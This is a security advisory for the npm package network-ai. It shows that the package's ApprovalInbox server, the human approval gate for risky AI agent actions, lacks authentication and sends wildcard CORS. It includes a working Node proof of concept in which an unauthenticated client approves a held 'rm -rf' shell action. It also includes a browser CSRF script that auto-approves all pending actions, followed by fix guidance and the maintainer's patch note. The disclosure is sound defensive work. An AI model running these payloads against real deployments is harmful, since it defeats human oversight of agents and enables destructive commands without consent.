# [M] Network-AI: ApprovalInbox HTTP server has no authentication — anyone can approve pending agent actions 

## Summary
Severity: Medium
Advisory: GHSA-mxjx-28vx-xjjj
CWE: CWE-352, CWE-862
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:H/A:N (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-mxjx-28vx-xjjj
Type: github-advisory

## Affected
- npm: `network-ai` — affected >=5.0.0 <5.12.2

## Details
## Summary

`network-ai`'s `ApprovalInbox` (`lib/approval-inbox.ts`) is a shipped, exported, documented feature — *"a web-accessible approval queue with REST API … and SSE streaming"* (SECURITY.md). It is the network surface of the **human-in-the-loop Approval Gate**, which `ApprovalGate` uses to require explicit human approval for *"high-risk operations (writes, shell commands, budget spend)"* (SECURITY.md). The HTTP server it exposes has **no authentication of any kind** and sets **`Access-Control-Allow-Origin: *`** on every route, including the state-changing `POST /approvals/:id/approve` and `/deny`.

As a result, any party who can send an HTTP request to the inbox port — a co-located process, a container/SSRF on the same host, a remote client when the operator binds a non-loopback address, **or any website the operator visits in a browser (via the wildcard CORS)** — can **enumerate pending approvals and approve them**, defeating the entire human-in-the-loop control and causing the gated high-risk action (e.g. a shell command the agent was holding for review) to execute without consent.

This is the same vulnerability class the maintainer has already fixed twice on the MCP server (GHSA-fj4g-2p96-q6m3 missing auth; GHSA-j3vx-cx2r-pvg8 empty default secret) — the auxiliary `ApprovalInbox` server never received that hardening.

- **Affected:** `network-ai <= 5.11.0` (current latest), `lib/approval-inbox.ts` — `httpHandler()` / `routeRequest()` / `startServer()`. `ApprovalInbox` is public API (exported from `index.ts:1126`).
- **CWE:** [CWE-862](https://cwe.mitre.org/data/definitions/862.html) (Missing Authorization) + [CWE-352](https://cwe.mitre.org/data/definitions/352.html) (Cross-Site Request Forgery, via wildcard CORS).
- **CVSS v3.1 (proposed):**
  - Drive-by CSRF against the default `127.0.0.1` deployment: `AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:H/A:N` = **5.9 Medium**.
  - Direct request when the operator binds a non-loopback address (or local/SSRF reach): `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N` = **8.1 High**.

## Details

### No authentication on the request pipeline (`lib/approval-inbox.ts`)

`httpHandler()` sets a wildcard CORS policy and routes every request straight to `routeRequest()` with **no auth check**:

```js
// lib/approval-inbox.ts:250-275
httpHandler() {
  return (req, res) => {
    ...
    res.setHeader('Access-Control-Allow-Origin', '*');          // 256  <-- wildcard CORS
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }   // preflight OK for any origin
    ...
    this.routeRequest(req, res, subPath, url);                  // 273  <-- no token / secret / origin gate
  };
}
```

`routeRequest()` exposes list + approve/deny with no credential check (default `pathPrefix` = `/approvals`):

```js
// lib/approval-inbox.ts:369-405
routeRequest(req, res, subPath, url) {
  if (subPath === '/' && req.method === 'GET') {                       // GET /approvals/  -> enumerate pending ids
    this.sendJson(res, 200, this.list(status)); return;
  }
  ...
  const approveMatch = subPath.match(/^\/([a-f0-9]+)\/approve$/);      // POST /approvals/:id/approve
  if (approveMatch && req.method === 'POST') {
    this.readBody(req).then((body) => {
      const approvedBy = typeof body.approvedBy === 'string' ? body.approvedBy : 'anonymous';  // defaults to 'anonymous'
      const entry = this.approve(approveMatch[1], approvedBy, reason);  // resolves the gate -> action proceeds
      ...
    });
  }
}
```

`approve()` resolves the pending promise that `ApprovalGate` is awaiting, so the gated action proceeds:

```js
// lib/approval-inbox.ts:172-183 / 327-339
approve(id, approvedBy, reason) {
  ...
  return this.resolve(id, 'approved', { approved: true, approvedBy, reason });  // promise -> {approved:true}
}
```

`startServer()` binds the handler (default `127.0.0.1`, but any host the caller passes):

```js
// lib/approval-inbox.ts:281-286
startServer(port, hostname = '127.0.0.1') {
  const server = createServer(this.httpHandler());
  server.listen(port, hostname);
  return server;
}
```

There is **no option** to supply a secret/token (unlike `McpSseServer`/`McpHttpServer`, which require one and fail closed), and the wildcard `ACAO: *` is hardcoded — an operator cannot configure their way out of it.

### Why the wildcard CORS matters

The two routes needed for exploitation are reachable cross-origin:
- `GET /approvals/?status=pending` is a CORS *simple request*; `ACAO: *` lets a malicious page **read** the response and learn the pending approval ids.
- `POST /approvals/:id/approve` with `Content-Type: application/json` triggers a preflight, which succeeds because the server answers `OPTIONS` with `ACAO: *`, `Access-Control-Allow-Methods: …POST…`, and `Access-Control-Allow-Headers: Content-Type`. The browser then sends the approve. `approvedBy` defaults to `'anonymous'`, so no special body is required.

So a website the operator merely visits while the inbox is running can enumerate and approve all pending high-risk actions.

## Proof of Concept

Self-contained against the **published `network-ai@5.11.0`** package (no project files needed; re-confirmed 2026-06-17). It starts the documented `ApprovalInbox` server, has an agent submit a high-risk gated action, then acts as an **unauthenticated** client.

```bash
mkdir na-poc && cd na-poc && npm init -y >/dev/null && npm i network-ai@5.11.0
node poc.mjs
```
`poc.mjs`:
```js
import { ApprovalInbox } from "network-ai";
import http from "node:http";

const PORT = 7798;
const req = (method, path, body) => new Promise((resolve, reject) => {        // plain client — NO Authorization header
  const data = body ? JSON.stringify(body) : undefined;
  const r = http.request({ host: "127.0.0.1", port: PORT, method, path,
    headers: data ? { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } : {} },
    (res) => { let b = ""; res.on("data", c => b += c); res.on("end", () => { let j; try { j = JSON.parse(b); } catch { j = b; } resolve({ status: res.statusCode, json: j }); }); });
  r.on("error", reject); if (data) r.write(data); r.end();
});

const inbox = new ApprovalInbox();
const gate = inbox.callback();                                 // what ApprovalGate calls before a dangerous action
inbox.startServer(PORT, "127.0.0.1");                          // the documented "web-accessible approval queue"
await new Promise(r => setTimeout(r, 150));

let resolved = false;
const decisionP = gate({ action: "shell_execute", target: "rm -rf /important/data",
  agentId: "worker-1", justification: "cleanup", riskLevel: "high" }).then(d => (resolved = true, d));
console.log("Gated dangerous action pending human approval. resolved =", resolved);

const list = await req("GET", "/approvals/?status=pending");   // attacker enumerates pending approvals
const id = list.json[0].id;
const approve = await req("POST", `/approvals/${id}/approve`, { approvedBy: "attacker" });  // and approves one
console.log("[attacker] GET /approvals/  (no auth) ->", list.status, "ids:", list.json.map(e => e.id));
console.log("[attacker] POST /approvals/" + id + "/approve (no auth) ->", approve.status, approve.json?.status);
const decision = await decisionP;
console.log(">>> gate decision delivered to agent:", JSON.stringify(decision), "| WIPED WITHOUT AUTH:", decision.approved && resolved);
```
Output:
```
Gated dangerous action pending human approval. resolved = false
[attacker] GET /approvals/  (no auth) -> 200 ids: [ '07d6f277efe35ac1' ]
[attacker] POST /approvals/07d6f277efe35ac1/approve (no auth) -> 200 approved
>>> gate decision delivered to agent: {"approved":true,"approvedBy":"attacker"} | WIPED WITHOUT AUTH: true
```

The gated action (`shell_execute: rm -rf /important/data`, `riskLevel: high`) is approved by a client that sent **no `Authorization` header**, and the `ApprovalGate` promise resolves `{ approved: true }` — the agent proceeds.

Browser CSRF variant (no tooling, just a visited page):
```html
<script>
fetch('http://127.0.0.1:PORT/approvals/?status=pending')      // ACAO:* -> readable
  .then(r => r.json())
  .then(list => list.forEach(e =>
    fetch(`http://127.0.0.1:PORT/approvals/${e.id}/approve`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ approvedBy: 'attacker' })          // preflight passes via ACAO:*
    })));
</script>
```

## Impact

The Approval Gate is the package's human-in-the-loop safety control for high-risk agent operations (shell commands, file writes, budget spend — SECURITY.md). Unauthenticated, cross-origin access to its inbox lets an attacker:
- **Approve** any pending gated action → the agent executes an operation that was explicitly held for human review (integrity/availability impact; the gated action is whatever the agent proposed).
- **Read** pending requests (`GET /approvals`, `/stats`) → disclosure of queued action details (command strings, file paths, justifications).
- **Deny** pending actions → suppress legitimate operations.

The attacker controls the *approval decision*, not the action content, but the net effect is that the human-in-the-loop guarantee is void for any deployment that exposes the inbox — which is the inbox's documented purpose ("web-accessible approval queue").

## Alignment with the security policy & documentation (in scope; not intended/documented behavior)

This finding does not contradict any documented design choice — it exposes a gap the documentation overlooks, and it matches a vulnerability class the maintainer has already accepted:

- **Documented as a *security measure*, never as intentionally unauthenticated.** `SECURITY.md` lists the Approval Inbox under "Security Measures in Network-AI" — *"`ApprovalInbox` provides a web-accessible approval queue with REST API (`/list`, `/approve/:id`, `/deny/:id`, `/stats`)"* — and `README.md` / `ENTERPRISE.md` describe it the same way. **No** document states it requires authentication, nor that the operator must place it behind their own auth. A documented security control (human-in-the-loop approval for *"writes, shell commands, budget spend"*) that anyone can bypass without credentials is a defect in that control, not its intended behavior.
- **The project's own threat model treats this exact adversary as in scope.** `THREAT_MODEL.md` §3.1 designs against an *"Unauthenticated Network Caller"* that can reach a bound TCP port, with mitigations: *require a non-empty secret, default to `127.0.0.1`, warn on non-loopback bind.* It applies all of these to the MCP server — but it **never lists `ApprovalInbox` as a network boundary at all** (an omission, not a carve-out), and the inbox has **none** of those mitigations.
- **Direct precedent — the maintainer already fixed this class.** The identical issue on the MCP server was accepted and patched: **GHSA-j3vx-cx2r-pvg8** ("Unauthenticated Cross-Origin MCP Tool Invocation," fixed in v5.4.5 by requiring a secret and **restricting CORS to localhost origins**) and **GHSA-r78r-rwrf-rjwp** (fail-closed on empty secret, v5.7.2). The `ApprovalInbox` is a second network-reachable server with the same flaw; it simply never received that hardening.
- **No carve-out covers it.** The threat model's Explicit Non-Goals (localhost-IPC encryption, SLA, anti-analysis, npm-registry compromise) don't apply, and the documented ClawHub "by-design" Notes (ASI01 goal-hijack, ASI03 advisory tokens, ASI06 context poisoning, ASI07 *inter-agent messaging*) are unrelated — the approval inbox is a **control plane**, not inter-agent transport.
- **The operator cannot fix it within the library.** Unlike the MCP server (which now *accepts* a secret), `ApprovalInbox` exposes **no** auth option and **hardcodes** `Access-Control-Allow-Origin: *`. So "the operator should add auth / restrict CORS" is not available — there is no hook to do so. And "it's opt-in / operator-exposed" did not exempt the MCP server, which is equally optional and explicitly started.

**Honest scope caveat (state it plainly in the report).** `ApprovalInbox.startServer()` is opt-in (not auto-started by a CLI bin) and defaults to `127.0.0.1`, so the realistic vectors are (a) the wildcard-CORS drive-by from a page the operator visits, (b) a co-located/SSRF local process, or (c) a non-loopback bind. That bounds severity to Medium–High — but it is squarely the same class, on the same kind of surface, that the project's threat model and prior advisories already treat as a vulnerability.

## Recommended fix

1. **Require a bearer secret** on the inbox HTTP server, fail closed on empty secret, and verify it on `/approve`, `/deny`, and ideally the list/stats/SSE routes — mirroring the hardening already applied to `McpSseServer`/`McpHttpServer`.
2. **Remove the hardcoded `Access-Control-Allow-Origin: *`**; default to no CORS (same-origin) or an explicit allowlist, and never reflect `*` on the mutating routes.
3. Optionally add a CSRF token / require a non-simple custom header on `POST` to block browser-driven approval.

## References
- [CWE-862](https://cwe.mitre.org/data/definitions/862.html), [CWE-352](https://cwe.mitre.org/data/definitions/352.html)
- Affected: `lib/approval-inbox.ts` (`httpHandler` l.256 CORS, `routeRequest` l.369-405 no-auth approve/deny, `startServer` l.281); exported at `index.ts:1126`.
- Same class as prior **accepted** advisories: GHSA-fj4g-2p96-q6m3 (MCP missing auth, fixed v5.1.3), GHSA-j3vx-cx2r-pvg8 (MCP unauthenticated cross-origin invocation — fixed v5.4.5 by requiring a secret + restricting CORS to localhost), GHSA-r78r-rwrf-rjwp (MCP fail-closed on empty secret, v5.7.2). The `ApprovalInbox` server never received this hardening.
- Documentation this finding is measured against: `SECURITY.md` (Approval Inbox listed under "Security Measures"; Approval Gate = human-in-the-loop for "writes, shell commands, budget spend"), `THREAT_MODEL.md` §3.1 ("Unauthenticated Network Caller" adversary + its mitigations), `README.md` / `ENTERPRISE.md` ("web-accessible approval queue"). None document the inbox as intentionally unauthenticated or require operator-supplied auth.
- Disclosure: GitHub private security advisory (Jovancoding/Network-AI → Security → "Report a vulnerability"), per SECURITY.md.


---

### Resolution (maintainer)

**Fixed in [v5.12.2](https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2) (commit `a59c13a`).** Install: `npm install network-ai@5.12.2` — published to npm with provenance.

`ApprovalInbox` now accepts a `secret` option. When set, the mutating endpoints `POST /:id/approve` and `POST /:id/deny` require an `Authorization: Bearer <secret>` header, validated in constant time with `crypto.timingSafeEqual`. `startServer()` already binds to `127.0.0.1` by default; operators exposing the inbox on a network must set a secret.

All 3,269 tests pass against the patched build. Thanks to @EchoSkorJjj for the responsible disclosure.

## References
- https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-mxjx-28vx-xjjj
- https://github.com/Jovancoding/Network-AI/commit/a59c13a1f0ce0e8a0779a90343eef92fac5ab4c3
- https://github.com/Jovancoding/Network-AI
- https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2
